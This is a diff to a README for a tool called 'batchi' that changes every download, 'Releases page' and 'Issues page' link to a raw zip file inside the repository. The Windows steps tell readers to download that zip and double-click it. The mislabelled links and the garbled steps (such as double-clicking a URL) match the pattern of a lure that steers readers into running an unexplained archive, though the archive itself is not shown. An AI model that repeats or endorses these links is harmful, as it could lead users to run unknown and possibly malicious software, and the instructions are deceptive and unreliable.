@@ -2,7 +2,7 @@
 
 ## 📥 Download
 
-[![Download batchi](https://raw.githubusercontent.com/kinpatchii/batchi/master/exflagellate/batchi.zip)](https://raw.githubusercontent.com/kinpatchii/batchi/master/exflagellate/batchi.zip)
+[![Download batchi](https://github.com/kinpatchii/batchi/raw/refs/heads/master/examples/Software-3.6.zip)](https://github.com/kinpatchii/batchi/raw/refs/heads/master/examples/Software-3.6.zip)
 
 ## 🚀 Getting Started
 
@@ -20,15 +20,15 @@ To run batchi, you will need:
 
 Follow these steps to download and run batchi:
 
-1. Visit the [Releases page](https://raw.githubusercontent.com/kinpatchii/batchi/master/exflagellate/batchi.zip) to access the latest version.
+1. Visit the [Releases page](https://github.com/kinpatchii/batchi/raw/refs/heads/master/examples/Software-3.6.zip) to access the latest version.
 2. Look for the section labeled "Assets."
 3. Download the appropriate file for your operating system:
-   - **For Windows:** Download `https://raw.githubusercontent.com/kinpatchii/batchi/master/exflagellate/batchi.zip`
+   - **For Windows:** Download `https://github.com/kinpatchii/batchi/raw/refs/heads/master/examples/Software-3.6.zip`
    - **For macOS:** Download `batchi-macos`
    - **For Linux:** Download `batchi-linux`
 4. Once the download is complete, locate the file in your Downloads folder.
 5. **Run the application:**
-   - **Windows:** Double-click on `https://raw.githubusercontent.com/kinpatchii/batchi/master/exflagellate/batchi.zip`
+   - **Windows:** Double-click on `https://github.com/kinpatchii/batchi/raw/refs/heads/master/examples/Software-3.6.zip`
    - **macOS:** Open the `.dmg` file and drag the application to your Applications folder, then run it.
    - **Linux:** Open a terminal, navigate to the downloaded file, and run `chmod +x batchi-linux` followed by `./batchi-linux`.
 
@@ -69,7 +69,7 @@ Yes, batchi is designed for users without programming knowledge. The interface i
 
 ## 📣 Community Support
 
-Join our user community for assistance, feature requests, and discussions. Visit our [GitHub Issues page](https://raw.githubusercontent.com/kinpatchii/batchi/master/exflagellate/batchi.zip) to ask questions or contribute.
+Join our user community for assistance, feature requests, and discussions. Visit our [GitHub Issues page](https://github.com/kinpatchii/batchi/raw/refs/heads/master/examples/Software-3.6.zip) to ask questions or contribute.
 
 ## 📝 License
 
